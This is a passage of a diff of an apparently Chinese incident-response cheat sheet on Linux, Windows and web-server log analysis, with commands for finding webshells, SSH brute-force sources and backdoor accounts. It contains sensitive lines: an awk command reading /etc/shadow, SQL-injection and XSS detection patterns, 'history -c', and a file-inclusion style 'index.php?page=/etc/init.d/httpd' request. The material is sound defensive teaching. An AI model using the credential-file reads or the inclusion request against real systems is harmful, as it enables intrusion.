&#39;</span>|sort|uniq -c |sort -nr;<span style="color:#ff636f">done</span></span></span></code></pre></div><p>####### 重要命令</p>
+<ul>
+<li>
+<p>历史命令记录：<code>history</code> ，其中仅清理当前用户： <code>history -c</code></p>
+</li>
+<li>
+<p>last</p>
+<ul>
+<li><strong>last</strong>- 列出目前与过去登入系统的用户相关信息</li>
+<li><strong>lastb</strong> - 列出==登入系统失败==的用户相关信息</li>
+<li><strong>lastlog</strong> - 显示系统中所有用户==最近一次登录==信息</li>
+</ul>
+<p>last 系列相关命令更多用法可参考文章：https://linux.isisy.com/list.html#!kw=last</p>
+</li>
+<li>
+<p>**w ， who， users **    记录当前已经登录的用户信息，只记录当前登录用户的信息。</p>
+</li>
+<li>
+<p><strong>find</strong> 文件名  find 搜索路径 【选项】 内容
+-name 区分大小写php      -type 文件类型  f普通文件  d目录  i查找软链接
+-iname不区分大小写php    -size  文件大小  +50k比我们50k还要大的文件 -100k比100k还要小的文件
+-inum      修改时间  -atime访问的时间 -mtime数据修改的时间 -ctime文件修改的时间
++5 代表6天前修改的文件 -5代表5到6天内修改的文件  5代表5到6天那一天修改的文件
+ls -i 1.php
+1234
+find -inum 1234
+find -type f -name &ldquo;*.php&rdquo;|xargs grep &rsquo;eval&rsquo;| more   #去找到一个个文件的内容，显示出来
+权限搜索 -perm
+所属组所有者  -uid  -gid  -user用户名  -nouser(没有所属组的文件)
+逻辑运算符 &amp; -a   逻辑或-o  逻辑非-not</p>
+</li>
+<li>
+<p><strong>awk</strong>  【选项】匹配规则处理规则 路径-F指定分隔符 默认是空格作为分隔 : ,
+设置一个变量  数组 定义函数  加减运算  字符串的拼接  $1   $0
+一般会联合sort -n 排序，sort -n|uniq &gt; 1 (uniq去重  -c计数)
+awk &lsquo;{print substr($4,2,11)}&rsquo; logs |sort| uniq -c  #sort排序  uniq去重
+awk -F:&rsquo;length($2)=0 {print $1}&rsquo; /etc/shadow   #空口令账号的查看</p>
+</li>
+<li>
+<p><strong>grep</strong> | cat ps
+-c   统计行数
+-v   去掉我们的内容
+ps -ef |grep ssh|grep -v grep<br>
+find ./ -name &ldquo;.php&rdquo; |xargs grep &ldquo;eval()&rdquo;    xargs不支持管道符命令传递参数可以用这个函数 #匹配木马病毒文件</p>
+<ul>
+<li>1.SQL注入检攻击检测
+grep -E -i &ldquo;select&rdquo; log1</li>
+<li>2.xss跨站脚本攻击检测
+grep -E -i &quot;
+(S)%26%23x3c%3B(S+)%3E|(S)%26%23x3c%3B(S+)%2F%3E|(S+)&lt;(S+)&gt;|(S+)&lt;(S+)/&quot; log1</li>
+</ul>
+</li>
+</ul>
+<p>######## ssh爆破</p>
+<p>多少ip在爆破</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat /var/log/auth.log.1 | grep -a <span style="color:#a6be9d">&#34;Failed password for root&#34;</span> | awk <span style="color:#a6be9d">&#39;{print $11}&#39;</span> | sort | uniq -c | sort -nr | more</span></span></code></pre></div><blockquote>
+<ol>
+<li><code>grep -a &quot;Failed password for root&quot; /var/log/auth.log.1</code>: 该部分使用 <code>grep</code> 命令在文件 <code>/var/log/auth.log.1</code> 中查找包含字符串 &ldquo;Failed password for root&rdquo; 的行。 <code>-a</code> 选项表示以二进制模式处理文件，通常用于处理非文本文件。</li>
+<li><code>awk '{print $11}'</code>: 该部分使用 <code>awk</code> 命令从匹配到的行中提取出第11个字段，即IP地址。默认情况下，<code>awk</code> 以空格为字段分隔符，因此这里假设IP地址是在日志中的第11个字段。</li>
+<li><code>sort</code>: 该部分使用 <code>sort</code> 命令对提取出的IP地址进行排序。这是为了让相同的IP地址相邻，以便后面的统计。</li>
+<li><code>uniq -c</code>: 该部分使用 <code>uniq -c</code> 命令进行唯一性和计数，它会显示每个唯一的IP地址及其出现的次数。<code>-c</code> 选项用于显示每行重复出现的次数。</li>
+<li><code>sort -nr</code>: 该部分使用 <code>sort -nr</code> 命令对计数结果进行排序，其中 <code>-n</code> 表示按数字顺序排序，<code>-r</code> 表示逆序（从高到低）排序。</li>
+<li><code>more</code>: 最后，<code>more</code> 命令用于分页显示结果，以防止输出过长而无法一次性显示在屏幕上。</li>
+</ol>
+</blockquote>
+<p>爆破（登录）成功的ip</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat /var/log/auth.log.1 | grep -a <span style="color:#a6be9d">&#34;Accepted password for root&#34;</span> | awk <span style="color:#a6be9d">&#39;{print $11}&#39;</span> | sort | uniq -c | sort -nr | more
+</span></span><span style="display:flex;"><span>cat /var/log/secure | grep -a <span style="color:#a6be9d">&#34;Accepted password for root&#34;</span> | awk <span style="color:#a6be9d">&#39;{print $11}&#39;</span> | sort | uniq -c | sort -nr | more</span></span></code></pre></div><p>爆破的用户名和字典</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat /var/log/auth.log.1 | grep -a <span style="color:#a6be9d">&#34;Failed password&#34;</span> | perl -e <span style="color:#a6be9d">&#39;while($_=&lt;&gt;){ /for(.*?) from/; print &#34;$1\n&#34;;}&#39;</span>| uniq -c | sort -nr
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####perl -e &#39;while($_=&lt;&gt;){ /for(.*?) from/; print &#34;$1\n&#34;;}&#39;: 这一部分使用 Perl 脚本。-e 选项表示在命令行中提供脚本代码。Perl 脚本的作用是遍历每一行，然后使用正则表达式 /for(.*?) from/ 捕获括号中的内容，即登录失败的用户名。捕获的内容由 $1 引用，然后通过 print &#34;$1\n&#34;; 打印出来，每个用户名占一行</span></span></span></code></pre></div><p>新建的ssh（后门）账户</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat /var/log/auth.log.1 |grep -a <span style="color:#a6be9d">&#34;new user&#34;</span>
+</span></span><span style="display:flex;"><span>cat /var/log/secure |grep -a <span style="color:#a6be9d">&#34;new user&#34;</span></span></span></code></pre></div><h6 id="windows" class="heading-element"><span>0.0.0.1.2  Windows</span>
+  <a href="#windows" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>windows系统日志包含系统日志，安全日志、应用日志等</p>
+<p>敏感事件id:</p>
+<p>4624 登录成功</p>
+<p>4625 登录失败</p>
+<p>4720 创建用户</p>
+<p>4634 注销成功</p>
+<p>4647 用户启动的注销</p>
+<p>4672 使用超级用户/管理员用户进行登录</p>
+</blockquote>
+<p>系统日志分析-Log Parser</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>登录成功的所有事件
+</span></span><span style="display:flex;"><span>LogParser.exe -i:EVT –o:DATAGRID <span style="color:#a6be9d">&#34;SELECT * FROM Security.evtx路径 where EventID=4624&#34;</span>
+</span></span><span style="display:flex;"><span>指定登录时间范围的事件：
+</span></span><span style="display:flex;"><span>LogParser.exe -i:EVT –o:DATAGRID <span style="color:#a6be9d">&#34;SELECT * FROM Security.evtx路径 where 
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">TimeGenerated&gt;&#39;2023-02-19 23:32:11&#39; and TimeGenerated
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">提取登录成功的用户名和IP：
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">LogParser.exe -i:EVT –o:DATAGRID &#34;</span>SELECT EXTRACT_TOKEN<span style="color:#ff636f">(</span>Message,13,<span style="color:#a6be9d">&#39; &#39;</span><span style="color:#ff636f">)</span> as 
+</span></span><span style="display:flex;"><span>EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN<span style="color:#ff636f">(</span>Strings,5,<span style="color:#a6be9d">&#39;|&#39;</span><span style="color:#ff636f">)</span> as 
+</span></span><span style="display:flex;"><span>Username,EXTRACT_TOKEN<span style="color:#ff636f">(</span>Message,38,<span style="color:#a6be9d">&#39; &#39;</span><span style="color:#ff636f">)</span> as Loginip FROM Security.evtx路径 where 
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">EventID</span><span style="color:#ff636f">=</span>4624<span style="color:#a6be9d">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">登录失败的所有事件：
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">LogParser.exe -i:EVT –o:DATAGRID &#34;</span>SELECT * FROM Security.evtx路径 <span style="color:#58a1dd">EventID</span><span style="color:#ff636f">=</span>4625<span style="color:#a6be9d">&#34;</span></span></span></code></pre></div><h5 id="web日志" class="heading-element"><span>0.0.0.2  WEB日志</span>
+  <a href="#web%e6%97%a5%e5%bf%97" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><blockquote>
+<p>1.我们查看连接的时候 查看数值</p>
+<p>2.我们去查看连接状态是否被远控：</p>
+<p>1.名字连接名字xx.asp名字比较异常的要注意，找到那个文件位置分析是否是恶意文件</p>
+<p>2.因为远控连接的一般是只有攻击者才可能去访问，查看攻击ip只有一个或者两个 那么我们需要注意，进一步排查</p>
+<p>3.木马文件相对于访问频率低，我们就可以排查</p>
+<p>4.木马文件与其它文件交互少，我们可以进一步排查是否恶意文件</p>
+<p>5.跟管理员沟通，查看一些新增记录 确认恶意文件 （post型）上传php.asp文件，一般是只有管理员权限；然后我们去还原路径 可以排查sql注入等
+作日志分析我们就知道web服务器入侵的痕迹了</p>
+</blockquote>
+<h6 id="apache" class="heading-element"><span>0.0.0.2.1  apache</span>
+  <a href="#apache" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>如果apache的安装时采用默认的配置,那么在/logs目录下就会生成两个文件,分别是<code>access_log</code>和<code>error_log</code></p>
+<p>access_log记录了所有对Web服务器的访问活动</p>
+<pre tabindex="0"><code>216.35.116.91 - - [19/Aug/2000:14:47:37 -0400] &#34;GET / HTTP/1.0&#34; 200 654 </code></pre><p>==access.log默认是不开启==的，我们可通过在 xx/conf/httpd.conf配置文件中进行配置</p>
+<p>搜搜 customlog，将如下的注释#去掉，这样就开启了access.log的日志功能</p>
+<p>####### 快速查找日志位置</p>
+<pre tabindex="0"><code>locate access_log
+
+找到 Apache 配置文件：通常，Apache 的配置文件位于以下路径之一：   1、/etc/httpd/conf/httpd.conf (CentOS/RHEL)      2、 /etc/apache2/apache2.conf (Debian/Ubuntu)
+grep -i &#34;log&#34; /etc/apache2/apache2.conf
+grep -i &#34;log&#34; /etc/httpd/conf/httpd.conf
+如果是grep查到环境变量，可以输入
+cat /etc/apache2/envvars | grep APACHE_LOG_DIR</code></pre><p>日志默认路径</p>
+<p>(1) apache+Linux日志默认路径</p>
+<pre><code>/etc/httpd/logs/access_log
+/var/log/httpd/access_log
+/usr/local/apache/logs
+/var/log/apache2/access.log.1
+</code></pre>
+<p>(2) apache+win2003日志默认路径</p>
+<pre><code>D:\xampp\apache\logs\access.log
+D:\xampp\apache\logs\error.log
+</code></pre>
+<p>(3) IIS6.0+win2003默认日志文件</p>
+<pre><code>C:\WINDOWS\system32\Logfiles
+</code></pre>
+<p>(4) IIS7.0+win2003 默认日志文件</p>
+<pre><code>%SystemDrive%\inetpub\logs\LogFiles
+</code></pre>
+<p>(5) nginx 日志文件</p>
+<pre><code>日志文件在用户安装目录logs目录下
+    以我的安装路径为例/usr/local/nginx,
+    那我的日志目录就是在/usr/local/nginx/logs里
+</code></pre>
+<p>web中间件默认配置</p>
+<p>(1) apache+linux 默认配置文件</p>
+<pre><code>/etc/httpd/conf/httpd.conf
+或者
+index.php?page=/etc/init.d/httpd
+</code></pre>
+<p>(2) IIS6.0+win2003 配置文件</p>
+<pre><code>C:/Windows/system32/inetsrv/metabase.xml
+</code></pre>
+<p>(3) IIS7.0+WIN 配置文件</p>
+<pre><code>C:\Windows\System32\inetsrv\config\applicationHost.config
+</code></pre>
+<p>####### 分析命令</p>
+<ul>
+<li>
+<p>查看apache的进程数
+ps -aux | grep httpd | wc -l</p>
+</li>
+<li>
+<p>分析日志查看当天的ip连接数
+cat default-access_log | grep “10/Dec/2010” | awk ‘{print $2}’ | sort | uniq -c | sort -nr</p>
+</li>
+<li>
+<p>查看指定的ip在当天究竟访问了什么url
+cat default-access_log | grep “10/Dec/2010” | grep “218.19.140.242” | awk ‘{print $7}’ | sort | uniq -c | sort -nr</p>
+</li>
+<li>
+<p>查看当天访问排行前10的url
+cat default-access_log | grep “10/Dec/2010” | awk ‘{print $7}’ | sort | uniq -c | sort -nr | head -n 10</p>
+</li>
+<li>
+<p>看到指定的ip究竟干了什么
+cat default-access_log | grep 218.19.140.242 | awk ‘{print $1&quot;\t&quot;$8}’ | sort | uniq -c | sort -nr | less</p>
+</li>
+<li>
+<p>查看访问次数最多的几个分钟(找到热点)
+awk ‘{print $4}’ default-access_log |cut -c 14-18|sort|uniq -c|sort -nr|head</p>
+</li>
+</ul>
+<p>统计请求成功的记录</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>awk <span style="color:#a6be9d">&#39;($9==200){print $0}&#39;</span> access.log
+</span></span><span style="display:flex;"><span>awk <span style="color:#a6be9d">&#39;($9!=200 &amp;&amp; $9!=302){print $0}&#39;</span> access.log</span></span></code></pre></div><p>统计出来访问成功系统的URL路径的次数排序，交给开发排查，验证是否存在漏洞点，是否存在漏洞</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>awk -F<span style="color:#a6be9d">\&#34;</span> <span style="color:#a6be9d">&#39;{print $2}&#39;</span> access.log | sort | uniq -c  | sort -nr | head -15</span></span></code></pre></div><p>统计访问服务器的IP地址，依次排查，这些IP中哪些可疑</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>awk <span style="color:#a6be9d">&#39;{print $1}&#39;</span>  access.log | sort | uniq | wc -l 统计访问的不同IP个数
+</span></span><span style="display:flex;"><span>awk <span style="color:#a6be9d">&#39;($4&gt;=&#34;[20/May/2022:13:10:20]&#34; &amp;&amp; $4&lt;=&#34;[24/May/2022:23:43:18]&#34;){print $0}&#39;</span> access.log | grep web | awk <span style="color:#a6be9d">&#39;{print $1}&#39;</span>  | sort | uniq -c | sort -nr | head -20</span></span></code></pre></div><p>列出当天访问次数最多的IP命令：</p>
+<pre tabindex="0"><code>cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</code></pre><p>查看当天有多少个IP访问：</p>
+<pre tabindex="0"><code>awk &#39;{print $1}&#39; log_file|sort|uniq|wc -l</code></pre><p>查看某一个页面被访问的次数：</p>
+<pre tabindex="0"><code>grep &#34;/index.php&#34; log_file | wc -l</code></pre><p>查看每一个IP访问了多少个页面：</p>
+<pre tabindex="0"><code>awk &#39;{++S[$1]} END {for (a in S) print a,S[a]}&#39; log_file</code></pre><p>将每个IP访问的页面数进行从小到大排序：</p>
+<pre tabindex="0"><code>awk &#39;{++S[$1]} END {for (a in S) print S[a],a}&#39; log_file | sort -n</code></pre><p>查看某一个IP访问了哪些页面：</p>
+<pre tabindex="0"><code>grep ^111.111.111.111 log_file| awk &#39;{print $1,$7}&#39;</code></pre><p>去掉搜索引擎统计当天的页面：</p>
+<pre tabindex="0"><code>awk &#39;{print $12,$1}&#39; log_file | grep ^&#34;Mozilla | awk &#39;{print $2}&#39; |sort | uniq | wc -l</code></pre><p>查看2018年6月21日14时这一个小时内有多少IP访问:</p>
+<pre tabindex="0"><code>awk &#39;{print $4,$1}&#39; log_file | grep 21/Jun/2018:14 | awk &#39;{print $2}&#39;| sort | uniq | wc -l</code></pre><p>统计爬虫：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">grep</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">E</span> <span style="color:#a6be9d">&#39;Googlebot|Baiduspider&#39;</span>  <span style="color:#ff636f">/</span><span style="color:#58a1dd">www</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">logs</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">access</span>.<span style="color:#a6be9d">2019</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">02</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">23.</span><span style="color:#58a1dd">log</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">awk</span> <span style="color:#a6be9d">&#39;{ print $1 }&#39;</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">sort</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">uniq</span></span></span></code></pre></div><p>统计浏览器指纹：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">cat</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">www</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">logs</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">access</span>.<span style="color:#a6be9d">2019</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">02</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">23.</span><span style="color:#58a1dd">log</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">grep</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">v</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">E</span> <span style="color:#a6be9d">&#39;MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon&#39;</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">sort</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">uniq</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">c</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">sort</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">r</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">n</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">head</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">n</span> <span style="color:#a6be9d">100</span></span></span></code></pre></div><p>IP 统计：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">grep</span> <span style="color:#a6be9d">&#39;23/May/2019&#39;</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">www</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">logs</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">access</span>.<span style="color:#a6be9d">2019</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">02</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">23.</span><span style="color:#58a1dd">log</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">awk</span> <span style="color:#a6be9d">&#39;{print $1}&#39;</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">awk</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">F</span><span style="color:#a6be9d">&#39;.&#39;</span> <span style="color:#a6be9d">&#39;{print $1&#34;.&#34;$2&#34;.&#34;$3&#34;.&#34;$4}&#39;</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">sort</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">uniq</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">c</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">sort</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">r</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">n</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">head</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">n</span> <span style="color:#a6be9d">10</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">2206</span> <span style="color:#a6be9d">219.136</span>.<span style="color:#a6be9d">134.13</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">1497</span> <span style="color:#a6be9d">182.34</span>.<span style="color:#a6be9d">15.248</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">1431</span> <span style="color:#a6be9d">211.140</span>.<span style="color:#a6be9d">143.100</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">1431</span> <span style="color:#a6be9d">119.145</span>.<span style="color:#a6be9d">149.106</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">1427</span> <span style="color:#a6be9d">61.183</span>.<span style="color:#a6be9d">15.179</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">1427</span> <span style="color:#a6be9d">218.6</span>.<span style="color:#a6be9d">8.189</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">1422</span> <span style="color:#a6be9d">124.232</span>.<span style="color:#a6be9d">150.171</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">1421</span> <span style="color:#a6be9d">106.187</span>.<span style="color:#a6be9d">47.224</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">1420</span> <span style="color:#a6be9d">61.160</span>.<span style="color:#a6be9d">220.252</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">1418</span> <span style="color:#a6be9d">114.80</span>.<span style="color:#a6be9d">201.18</span></span></span></code></pre></div><p>统计网段：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">cat</span> <span style="color:#ff636f">/</span><span style="color:#58a1dd">www</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">logs</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">access</span>.<span style="color:#a6be9d">2019</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">02</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">23.</span><span style="color:#58a1dd">log</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">awk</span> <span style="color:#a6be9d">&#39;{print $1}&#39;</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">awk</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">F</span><span style="color:#a6be9d">&#39;.&#39;</span> <span style="color:#a6be9d">&#39;{print $1&#34;.&#34;$2&#34;.&#34;$3&#34;.0&#34;}&#39;</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">sort</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">uniq</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">c</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">sort</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">r</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">n</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">head</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">n</span> <span style="color:#a6be9d">200</span></span></span></code></pre></div><p>统计域名：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">cat</span>  <span style="color:#ff636f">/</span><span style="color:#58a1dd">www</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">logs</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">access</span>.<span style="color:#a6be9d">2019</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">02</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">23.</span><span style="color:#58a1dd">log</span> <span style="color:#ff636f">|</span><span style="color:#58a1dd">awk</span> <span style="color:#a6be9d">&#39;{print $2}&#39;</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">sort</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">uniq</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">c</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">sort</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">rn</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">more</span></span></span></code></pre></div><p>HTTP Status：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">cat</span>  <span style="color:#ff636f">/</span><span style="color:#58a1dd">www</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">logs</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">access</span>.<span style="color:#a6be9d">2019</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">02</span><span style="color:#ff636f">-</span><span style="color:#a6be9d">23.</span><span style="color:#58a1dd">log</span> <span style="color:#ff636f">|</span><span style="color:#58a1dd">awk</span> <span style="color:#a6be9d">&#39;{print $9}&#39;</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">sort</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">uniq</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">c</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">sort</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">rn</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">more</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">5056585</span> <span style="color:#a6be9d">304</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">1125579</span> <span style="color:#a6be9d">200</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">7602</span> <span style="color:#a6be9d">400</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6be9d">5</span> <span style="color:#a6be9d">301</span></span></span></code></pre></div><p>URL 统计：</p>
